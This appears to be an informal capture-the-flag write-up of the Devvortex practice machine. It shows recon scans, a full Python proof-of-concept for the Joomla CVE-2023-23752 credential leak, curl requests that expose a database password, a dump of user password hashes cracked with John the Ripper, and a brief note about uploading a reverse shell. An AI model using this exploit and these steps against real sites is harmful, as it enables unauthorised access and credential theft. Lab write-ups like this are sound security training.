
initial nmap scan

```
kali@kali ~> nmap -sC -sV devvortex.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 16:43 EST
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.076s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds

```


nothing so when we go on the website theres also nothing, thankfully a friend of mine gave me a hint on something to do with finding the vhost, so i used my trusty ffuf tool

```
kali@kali ~> ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.devvortex.htb/

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.devvortex.htb/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 131ms]
```

we have a first hit!, lets move on and see what this holds for us. we shall start with  a network and a directory scan on `dev.devvortex.htb`



Nmap 

```
kali@kali ~> nmap -sC -sV dev.devvortex.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 16:46 EST
Nmap scan report for dev.devvortex.htb (10.10.11.242)
Host is up (0.077s latency).
rDNS record for 10.10.11.242: devvortex.htb
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Devvortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds

```



dirsearch
```
kali@kali ~> dirsearch -u http://dev.devvortex.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_dev.devvortex.htb/__24-02-07_16-10-39.txt

Target: http://dev.devvortex.htb/

[16:10:39] Starting: 
[16:10:40] 403 -  564B  - /%2e%2e;/test
[16:10:41] 404 -   16B  - /php
[16:11:09] 404 -   16B  - /adminphp
[16:11:11] 403 -  564B  - /admin/.config
[16:11:39] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[16:11:39] 200 -   31B  - /administrator/cache/
[16:11:39] 403 -  564B  - /administrator/includes/
[16:11:39] 200 -   12KB - /administrator/
[16:11:39] 200 -   31B  - /administrator/logs/
[16:11:39] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[16:11:40] 200 -   12KB - /administrator/index.php
[16:11:45] 403 -  564B  - /admpar/.ftppass
[16:11:45] 403 -  564B  - /admrev/.ftppass
[16:11:48] 301 -  178B  - /api  ->  http://dev.devvortex.htb/api/
[16:11:49] 404 -   54B  - /api/_swagger_/
[16:11:49] 404 -   54B  - /api/api-docs
[16:11:49] 404 -   54B  - /api/apidocs
[16:11:49] 404 -   54B  - /api/2/issue/createmeta
[16:11:49] 404 -   54B  - /api/__swagger__/
[16:11:49] 404 -   54B  - /api/
[16:11:49] 404 -   54B  - /api/api
[16:11:49] 404 -   54B  - /api/2/explore/
[16:11:49] 404 -   54B  - /api/config
[16:11:49] 404 -   54B  - /api/docs
[16:11:49] 404 -   54B  - /api/application.wadl
[16:11:49] 404 -   54B  - /api/apidocs/swagger.json
[16:11:49] 404 -   54B  - /api/jsonws
[16:11:49] 404 -   54B  - /api/index.html
[16:11:49] 404 -   54B  - /api/swagger.yaml
[16:11:49] 404 -   54B  - /api/docs/
[16:11:49] 404 -   54B  - /api/swagger-ui.html
[16:11:49] 404 -   54B  - /api/batch
[16:11:49] 404 -   54B  - /api/swagger.json
[16:11:49] 404 -   54B  - /api/error_log
[16:11:49] 404 -   54B  - /api/swagger/static/index.html
[16:11:49] 404 -   54B  - /api/swagger/index.html
[16:11:49] 404 -   54B  - /api/jsonws/invoke
[16:11:49] 404 -   54B  - /api/cask/graphql
[16:11:49] 404 -   54B  - /api/proxy
[16:11:49] 404 -   54B  - /api/snapshots
[16:11:49] 404 -   54B  - /api/login.json
[16:11:49] 404 -   54B  - /api/spec/swagger.json
[16:11:50] 404 -   54B  - /api/swagger
[16:11:50] 404 -   54B  - /api/package_search/v4/documentation
[16:11:50] 404 -   54B  - /api/swagger.yml
[16:11:50] 404 -   54B  - /api/profile
[16:11:50] 404 -   54B  - /api/swagger/swagger
[16:11:50] 404 -   54B  - /api/v2
[16:11:50] 404 -   54B  - /api/timelion/run
[16:11:50] 404 -   54B  - /api/swagger/ui/index
[16:11:50] 404 -   54B  - /api/v2/swagger.json
[16:11:50] 404 -   54B  - /api/v2/helpdesk/discover
[16:11:50] 404 -   54B  - /api/v1/
[16:11:50] 404 -   54B  - /api/v1/swagger.json
[16:11:50] 404 -   54B  - /api/v1
[16:11:50] 404 -   54B  - /api/v3
[16:11:50] 404 -   54B  - /api/v2/swagger.yaml
[16:11:50] 404 -   54B  - /api/v1/swagger.yaml
[16:11:50] 404 -   54B  - /api/v4
[16:11:50] 404 -   54B  - /api/v2/
[16:11:50] 404 -   54B  - /api/version
[16:11:50] 404 -   54B  - /api/vendor/phpunit/phpunit/phpunit
[16:11:50] 404 -   54B  - /api/whoami
[16:12:02] 403 -  564B  - /bitrix/.settings
[16:12:02] 403 -  564B  - /bitrix/.settings.bak
[16:12:02] 403 -  564B  - /bitrix/.settings.php.bak
[16:12:06] 301 -  178B  - /cache  ->  http://dev.devvortex.htb/cache/
[16:12:07] 200 -   31B  - /cache/
[16:12:07] 403 -    4KB - /cache/sql_error_latest.cgi
[16:12:13] 200 -   31B  - /cli/
[16:12:16] 301 -  178B  - /components  ->  http://dev.devvortex.htb/components/
[16:12:16] 200 -   31B  - /components/
[16:12:20] 200 -    0B  - /configuration.php
[16:12:45] 403 -  564B  - /ext/.deps
[16:12:59] 200 -    7KB - /htaccess.txt
[16:13:02] 200 -   31B  - /images/
[16:13:02] 301 -  178B  - /images  ->  http://dev.devvortex.htb/images/
[16:13:03] 403 -    4KB - /images/c99.php
[16:13:03] 403 -    4KB - /images/Sym.php
[16:13:04] 301 -  178B  - /includes  ->  http://dev.devvortex.htb/includes/
[16:13:04] 200 -   31B  - /includes/
[16:13:14] 301 -  178B  - /language  ->  http://dev.devvortex.htb/language/
[16:13:14] 200 -   31B  - /layouts/
[16:13:15] 403 -  564B  - /lib/flex/uploader/.settings
[16:13:15] 403 -  564B  - /lib/flex/uploader/.actionScriptProperties
[16:13:15] 403 -  564B  - /lib/flex/uploader/.project
[16:13:15] 403 -  564B  - /lib/flex/varien/.actionScriptProperties
[16:13:15] 403 -  564B  - /lib/flex/uploader/.flexProperties
[16:13:15] 403 -  564B  - /lib/flex/varien/.flexLibProperties
[16:13:15] 403 -  564B  - /lib/flex/varien/.project
[16:13:15] 403 -  564B  - /lib/flex/varien/.settings
[16:13:15] 200 -   31B  - /libraries/
[16:13:15] 301 -  178B  - /libraries  ->  http://dev.devvortex.htb/libraries/
[16:13:16] 200 -   18KB - /LICENSE.txt
[16:13:23] 403 -  564B  - /mailer/.env
[16:13:26] 301 -  178B  - /media  ->  http://dev.devvortex.htb/media/
[16:13:27] 200 -   31B  - /media/
[16:13:32] 301 -  178B  - /modules  ->  http://dev.devvortex.htb/modules/
[16:13:32] 200 -   31B  - /modules/
[16:13:34] 404 -   16B  - /myadminphp
[16:13:58] 301 -  178B  - /plugins  ->  http://dev.devvortex.htb/plugins/
[16:13:58] 200 -   31B  - /plugins/
[16:14:07] 200 -    5KB - /README.txt
[16:14:10] 403 -  564B  - /resources/.arch-internal-preview.css
[16:14:10] 403 -  564B  - /resources/sass/.sass-cache/
[16:14:11] 200 -  764B  - /robots.txt
[16:14:15] 404 -    4KB - /secure/ConfigurePortalPages!default.jspa?view=popular
[16:14:39] 200 -   31B  - /templates/
[16:14:39] 301 -  178B  - /templates  ->  http://dev.devvortex.htb/templates/
[16:14:39] 200 -   31B  - /templates/index.html
[16:14:40] 200 -    0B  - /templates/system/
[16:14:43] 200 -   31B  - /tmp/
[16:14:43] 301 -  178B  - /tmp  ->  http://dev.devvortex.htb/tmp/
[16:14:43] 403 -    4KB - /tmp/admin.php
[16:14:43] 403 -    4KB - /tmp/2.php
[16:14:43] 403 -    4KB - /tmp/d0maine.php
[16:14:43] 403 -    4KB - /tmp/cgi.pl
[16:14:43] 403 -    4KB - /tmp/dz.php
[16:14:44] 403 -    4KB - /tmp/domaine.pl
[16:14:44] 403 -    4KB - /tmp/changeall.php
[16:14:44] 403 -    4KB - /tmp/domaine.php
[16:14:44] 403 -    4KB - /tmp/Cgishell.pl
[16:14:44] 403 -    4KB - /tmp/cpn.php
[16:14:44] 403 -    4KB - /tmp/d.php
[16:14:44] 403 -    4KB - /tmp/dz1.php
[16:14:44] 403 -    4KB - /tmp/killer.php
[16:14:44] 403 -    4KB - /tmp/index.php
[16:14:44] 403 -    4KB - /tmp/madspotshell.php
[16:14:44] 403 -    4KB - /tmp/L3b.php
[16:14:44] 403 -    4KB - /tmp/sql.php
[16:14:44] 403 -    4KB - /tmp/root.php
[16:14:44] 403 -    4KB - /tmp/Sym.php
[16:14:44] 403 -    4KB - /tmp/up.php
[16:14:44] 403 -    4KB - /tmp/priv8.php
[16:14:44] 403 -    4KB - /tmp/uploads.php
[16:14:44] 403 -    4KB - /tmp/user.php
[16:14:44] 403 -    4KB - /tmp/upload.php
[16:14:44] 403 -    4KB - /tmp/vaga.php
[16:14:44] 403 -    4KB - /tmp/whmcs.php
[16:14:44] 403 -    4KB - /tmp/xd.php
[16:14:45] 403 -  564B  - /twitter/.env
[16:15:00] 200 -    3KB - /web.config.txt

```

ofcourse the directory `administator` being 301 really is a massive eye opener so lets see what we get there


we get a joomla administrator page so lets run a joomla scan

```
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.devvortex.htb/

```


http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/


so looking up `Joomla 4.2.6` on google gives us a quick result 
`https://github.com/Acceis/exploit-CVE-2023-23752`

so im not really a big fan of ruby and i decided to try my best to look for a python exploit so i can analyze the script so i ended up finding this script `https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT`
now let us read the python script and analyze whats inside of this baby

```
#!/bin/python3

import json
import requests
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
import argparse

def ascii():
    console.print("[magenta]┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓[/magenta]")
    console.print("[magenta]┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛[/magenta]")
    console.print("[magenta]┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━[/magenta]")
    console.print("Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ")
    print("")

user_agent = {'User-Agent': 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16'}
disable_warnings(InsecureRequestWarning)
console = Console()

def check_vuln(target, path):
    console.print("[blue][*][/blue] Checking if target is vulnerable")

    send_get = requests.get(target + path, headers=user_agent, verify=False)
    if send_get.status_code == 200:
        console.print("[green][+][/green] Target is vulnerable")
        console.print(f"[blue][*][/blue] Launching exploit against: {target}")
    else:
        console.print("[red][~][/red] Target is not vulnerable")
        exit()

def fetch_usernames(target, path):
    print("---" * 37)
    console.print(f"[blue][*][/blue] Checking if target is vulnerable for usernames at path: {path}")

    send_get = requests.get(target + path, headers=user_agent, verify=False).text
    try:
        resp_json = json.loads(send_get)
        if "data" in resp_json and len(resp_json["data"]) > 0:
            console.print("[green][+][/green] Target is vulnerable for usernames")
            console.print(f"[green][+][/green] Gathering username(s) for: {target}")
            users = resp_json["data"]
            for user in users:
                attributes = user.get("attributes", {})
                username = attributes.get("username")
                if username:
                    console.print(f"[green][+][/green] Username: {username}")
                else:
                    console.print("[red][~][/red] No usernames found")
        else:
            console.print("[red][~][/red] No usernames found or empty response")
    except json.JSONDecodeError:
        console.print("[yellow][!][/yellow] Error occurred while checking for usernames")

def fetch_passwords(target, path):
    print("---" * 37)
    console.print(f"[blue][*][/blue] Checking if target is vulnerable for passwords at path: {path}")

    send_get = requests.get(target + path, headers=user_agent, timeout=3, verify=False).text
    try:
        resp_json = json.loads(send_get)
        if "data" in resp_json and len(resp_json["data"]) > 0:
            console.print("[green][+][/green] Target is vulnerable for passwords")
            console.print(f"[green][+][/green] Gathering password(s) for: {target}")
            passwords = resp_json["data"]
            for pwd in passwords:
                attributes = pwd.get("attributes", {})
                password = attributes.get("password")
                if password:
                    console.print(f"[green][+][/green] Password: {password}")
                else:
                    console.print("[red][~][red/] No passwords found")
        else:
            console.print("[red][~][/red] No passwords found or empty response")
    except json.JSONDecodeError:
        console.print("[yellow][!][/yellow] Error occurred while checking for passwords")

def exploit(target):
    vuln_path_users = '/api/index.php/v1/users?public=true'
    vuln_path_passwords = '/api/index.php/v1/config/application?public=true'

    check_vuln(target, vuln_path_users)
    fetch_usernames(target, vuln_path_users)
    fetch_passwords(target, vuln_path_passwords)

def main():
    ascii()
    parser = argparse.ArgumentParser(description="A PoC for CVE-2023-23752 - Improper access check")
    parser.add_argument("-u", "--url", help="Specify the target URL", required=True)
    args = parser.parse_args()

    target_url = args.url
    exploit(target_url)

if __name__ == "__main__":
    main()

```


the most important part from what ive read about the exploit is that its in the "Unauthenticated information disclosure" category where the endpoint of the REST API is exposed which leads to the leak of credentials. hence when we look this part of the script, we can determine that this is the location of which the credentials are stored 

`vuln_path_users = '/api/index.php/v1/users?public=true'`
`vuln_path_passwords = '/api/index.php/v1/config/application?public=true'`

so lets curl it and then pipe it into awk to see what we have

users!!
```
curl http://dev.devvortex.htb/api/index.php/v1/users?public=true/ | awk '{gsub(/[{},]/, "&\n  ")}1'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   699    0   699    0     0   3572      0 --:--:-- --:--:-- --:--:--  3566
{
  "links":{
  "self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/users?public=true\/"}
  ,
  "data":[{
  "type":"users",
  "id":"649",
  "attributes":{
  "id":649,
  "name":"lewis",
  "username":"lewis",
  "email":"lewis@devvortex.htb",
  "block":0,
  "sendEmail":1,
  "registerDate":"2023-09-25 16:44:24",
  "lastvisitDate":"2023-10-29 16:18:50",
  "lastResetTime":null,
  "resetCount":0,
  "group_count":1,
  "group_names":"Super Users"}
  }
  ,
  {
  "type":"users",
  "id":"650",
  "attributes":{
  "id":650,
  "name":"logan paul",
  "username":"logan",
  "email":"logan@devvortex.htb",
  "block":0,
  "sendEmail":0,
  "registerDate":"2023-09-26 19:15:42",
  "lastvisitDate":null,
  "lastResetTime":null,
  "resetCount":0,
  "group_count":1,
  "group_names":"Registered"}
  }
  ],
  "meta":{
  "total-pages":1}
  }

```


passwords!!
```
curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true/ | awk '{gsub(/[{},]/, "&\n")}1'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2016    0  2016    0     0  10260      0 --:--:-- --:--:-- --:--:-- 10338
{
"links":{
"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true\/",
"next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true\/&page%5Boffset%5D=20&page%5Blimit%5D=20",
"last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true\/&page%5Boffset%5D=60&page%5Blimit%5D=20"}
,
"data":[{
"type":"application",
"id":"224",
"attributes":{
"offline":false,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"offline_message":"This site is down for maintenance.<br>Please check back again soon.",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"display_offline_message":1,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"offline_image":"",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"sitename":"Development",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"editor":"tinymce",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"captcha":"0",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"list_limit":20,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"access":1,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"debug":false,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"debug_lang":false,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"debug_lang_const":true,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"dbtype":"mysqli",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"host":"localhost",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"user":"lewis",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"password":"P4ntherg0t1n5r3c0n##",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"db":"joomla",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"dbprefix":"sd4fg_",
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"dbencryption":0,
"id":224}
}
,
{
"type":"application",
"id":"224",
"attributes":{
"dbsslverifyservercert":false,
"id":224}
}
],
"meta":{
"total-pages":4}
}

```


so now we have 2 very good results which are

```
  "data":[{
  "type":"users",
  "id":"649",
  "attributes":{
  "id":649,
  "name":"lewis",
  "username":"lewis",
  "email":"lewis@devvortex.htb",
  "block":0,
  "sendEmail":1,
  "registerDate":"2023-09-25 16:44:24",
  "lastvisitDate":"2023-10-29 16:18:50",
  "lastResetTime":null,
  "resetCount":0,
  "group_count":1,
  "group_names":"Super Users"}
  }
```

```
{
"type":"application",
"id":"224",
"attributes":{
"password":"P4ntherg0t1n5r3c0n##",
"id":224}
}
```

now (i assume) we can log in to joomla!

open template and upload revshell there

notes:

```
[1] - Single Scan
[2] - Massive Scan

[CVE-2023-23752]: 1

IP/Domain: dev.devvortex.htb

[CVE-2023-23752] - dev.devvortex.htb .: [Scanning!]

[+] Domain            : dev.devvortex.htb
[+] Database Type     : mysqli
[+] Database Prefix   : sd4fg_
[+] Database          : joomla
[+] Hostname          : localhost
[+] Username          : lewis
[+] Password          : P4ntherg0t1n5r3c0n##

```


```
mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-02-09 15:24:37 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

```


`lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u`
`logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`


```
kali@kali ~/H/devvortex> john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:44 0.01% (ETA: 2024-02-17 16:03) 0g/s 24.47p/s 48.95c/s 48.95C/s thuglife..brittney
0g 0:00:00:45 0.01% (ETA: 2024-02-17 14:09) 0g/s 24.64p/s 49.28c/s 49.28C/s superman1..summer1
0g 0:00:00:46 0.01% (ETA: 2024-02-17 12:21) 0g/s 24.79p/s 49.59c/s 49.59C/s 753951..mickeymouse
0g 0:00:00:47 0.01% (ETA: 2024-02-17 16:33) 0g/s 24.48p/s 49.73c/s 49.73C/s 753951..mickeymouse
0g 0:00:00:48 0.01% (ETA: 2024-02-17 14:35) 0g/s 24.58p/s 49.91c/s 49.91C/s curtis..photos
tequieromucho    (?)     
```


https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/

